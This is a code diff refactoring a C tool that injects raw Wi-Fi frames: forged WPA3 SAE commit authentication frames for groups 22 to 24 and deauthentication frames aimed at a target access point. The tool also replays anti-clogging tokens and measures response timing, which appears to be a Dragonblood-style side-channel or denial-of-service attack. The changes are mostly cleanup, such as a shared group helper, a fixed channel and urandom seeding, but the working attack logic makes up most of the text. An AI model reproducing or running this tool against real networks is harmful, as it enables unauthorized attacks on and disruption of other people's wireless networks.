@@ -14,13 +14,11 @@
 
 static struct state *get_state(void) { return &_state; }
 
-static void open_card(struct state *state, char *dev, int chan) {
+static void card_open(struct state *state, char *dev) {
 	printf("Opening card %s\n", dev);
 	if ((state->wi = wi_open(dev)) == NULL)
 		err(1, "wi_open()");
-
-	printf("Setting chan %d\n", chan);
-	if (wi_set_channel(state->wi, chan) == -1)
+	if (wi_set_channel(state->wi, 1) == -1)
 		err(1, "card_set_chan()");
 }
 
@@ -33,8 +31,31 @@ static int card_read(struct state *state, void *buf, int len, struct rx_info *ri
 	return rc;
 }
 
-static int card_write(struct state *state, void *buf, int len, struct tx_info *ti) {
-	return wi_write(state->wi, NULL, 0, buf, len, ti);
+static int card_write(struct state *state, void *buf, int len) {
+	return wi_write(state->wi, NULL, 0, buf, len, NULL);
+}
+
+static int get_group(const int group, unsigned char *buf) {
+	int len;
+
+	switch (group) {
+		case 22:
+			len = (int) AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
+			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_22, len);
+			break;
+		case 23:
+			len = (int) AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
+			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_23, len);
+			break;
+		case 24:
+			len = (int) AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
+			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_24, len);
+			break;
+		default:
+			return 0;
+	}
+
+	return len;
 }
 
 static void inject_sae_commit(struct state *state) {
@@ -43,29 +64,13 @@ static void inject_sae_commit(struct state *state) {
 	if (!state->started_attack)
 		return;
 
-	int len;
-	switch (state->group) {
-		case 22:
-			len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
-			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_22, len);
-			break;
-		case 23:
-			len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
-			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_23, len);
-			break;
-		case 24:
-			len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
-			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_24, len);
-			break;
-		default:
-			return;
-	}
+	const int len = get_group(state->group, buf);
 
 	memcpy(buf + 4, state->bssid, 6);
 	memcpy(buf + 10, state->srcaddr, 6);
 	memcpy(buf + 16, state->bssid, 6);
 
-	if (card_write(state, buf, len, NULL) == -1)
+	if (card_write(state, buf, len) == -1)
 		perror("card_write");
 
 	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
@@ -79,7 +84,7 @@ static void inject_deauth(struct state *state) {
 	memcpy(buf + 10, state->srcaddr, 6);
 	memcpy(buf + 16, state->bssid, 6);
 
-	if (card_write(state, buf, DEAUTH_FRAME_SIZE, NULL) == -1)
+	if (card_write(state, buf, (int) DEAUTH_FRAME_SIZE) == -1)
 		perror("card_write");
 }
 
@@ -100,13 +105,8 @@ static void queue_next_commit(struct state *state) {
 static void process_packet(struct state *state, unsigned char *buf, int len) {
 	int pos_bssid, pos_src;
 
-	//printf("process_packet: %d\n", len);
-
 	/* Ignore retransmitted frames */
-	if (buf[1] & 0x08) {
-		//printf("Ignoring retransmission\n");
-		return;
-	}
+	if (buf[1] & 0x08) return;
 
 	/* Extract addresses */
 	switch (buf[1] & 3) {
@@ -149,10 +149,8 @@ static void process_packet(struct state *state, unsigned char *buf, int len) {
 	/* Detect Authentication frames */
 	else if (len >= 24 + 8 &&
 	         buf[0] == 0xb0 && /* Type is Authentication */
-	         buf[24] == 0x03 /*&&*/ /* Auth type is SAE */
-		/*buf[26] == 0x01*/) /* Sequence number is 1 */
-	{
-		/* Check if status is good and its the first reply */
+	         buf[24] == 0x03 /* Auth type is SAE */) {
+		/* Check if status is good and it's the first reply */
 		if (buf[28] == 0x00) {
 			struct timespec curr, diff;
 
@@ -188,28 +186,13 @@ static void process_packet(struct state *state, unsigned char *buf, int len) {
 		}
 		/* Status equals Anti-Clogging Token Required */
 		else if (buf[28] == 0x4C) {
-			unsigned char *token = buf + 24 + 8;
-			int token_len = len - 24 - 8;
+			const unsigned char *token = buf + 24 + 8;
+			const int token_len = len - 24 - 8;
 			unsigned char reply[2048] = {0};
-			size_t reply_len = 0;
+			int reply_len = 0;
 
 			/* fill in basic frame */
-			switch (state->group) {
-				case 22:
-					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
-					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_22, reply_len);
-					break;
-				case 23:
-					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
-					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_23, reply_len);
-					break;
-				case 24:
-					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
-					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_24, reply_len);
-					break;
-				default:
-					return;
-			}
+			reply_len = get_group(state->group, reply);
 
 			/* token comes after status and group id, before scalar and element */
 			int pos = 24 + 8;
@@ -222,7 +205,7 @@ static void process_packet(struct state *state, unsigned char *buf, int len) {
 			memcpy(reply + 10, buf + 4, 6);
 			memcpy(reply + 16, state->bssid, 6);
 
-			if (card_write(state, reply, reply_len, NULL) == -1)
+			if (card_write(state, reply, reply_len) == -1)
 				perror("card_write");
 			clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
 		}
@@ -272,12 +255,12 @@ static void check_timeout(struct state *state) {
 	}
 }
 
-static void event_loop(struct state *state, char *dev, int chan) {
+static void event_loop(struct state *state, char *dev) {
 	struct pollfd fds[3];
 	struct itimerspec timespec;
 
 	// 1. Open the card and get the MAC address
-	open_card(state, dev, chan);
+	card_open(state, dev);
 	wi_set_rate(state->wi, USED_RATE);
 	wi_get_mac(state->wi, state->srcaddr);
 
@@ -377,13 +360,20 @@ static void sighandler(int signum) {
 	}
 }
 
-int main(int argc, char *argv[]) {
+int main(const int argc, char *argv[]) {
 	char *device = NULL;
 	int ch;
-	int chan = 1;
 	struct state *state = get_state();
 
-	srand(time(NULL));
+	unsigned int seed;
+	FILE *urandom = fopen("/dev/urandom", "r");
+	if (urandom) {
+		fread(&seed, sizeof(seed), 1, urandom);
+		fclose(urandom);
+	} else {
+		seed = time(NULL); // Fallback in case /dev/urandom is not available
+	}
+	srand(seed);
 
 	memset(state, 0, sizeof(*state));
 	state->curraddr = 0;
@@ -454,6 +444,6 @@ int main(int argc, char *argv[]) {
 	}
 	chmod(state->output_file, 0766);
 
-	event_loop(state, device, chan);
+	event_loop(state, device);
 	exit(0);
 }
